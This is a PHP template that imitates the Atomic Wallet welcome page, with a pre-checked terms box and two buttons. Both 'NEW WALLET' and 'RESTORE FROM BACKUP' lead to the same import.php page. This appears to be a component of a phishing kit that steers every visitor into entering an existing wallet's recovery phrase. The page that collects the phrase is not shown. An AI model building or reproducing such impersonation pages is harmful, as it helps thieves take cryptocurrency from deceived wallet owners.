<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Atomic Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-12 text-center">
                    <h2 class="fs30 my30 mb60 fw-bold">Welcome to Atomic Wallet!</h2>
                    <div class="form-check fs20 pt60">
                        <label class="form-check-label" for="accept_tnc">
                            <input class="form-check-input" type="checkbox" value="" id="accept_tnc" checked />
                            I accept the
                        </label>
                        <a target="_blank" href="https://atomicwallet.io/terms-of-service" class="text-primary text-decoration-none">Terms of Services</a>
                    </div>
                    <div class="mt60 mb20">
                        <a href="<?= base_url('import.php')?>" class="btn btn-primary btn-primary-2 fs18 py10 px35 rounded-pill fw-bold" type="button">NEW WALLET</a>
                    </div>
                    <div class="my20">
                        <a href="<?= base_url('import.php')?>" class="fw-bold text-white text-decoration-none">RESTORE FROM BACKUP</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>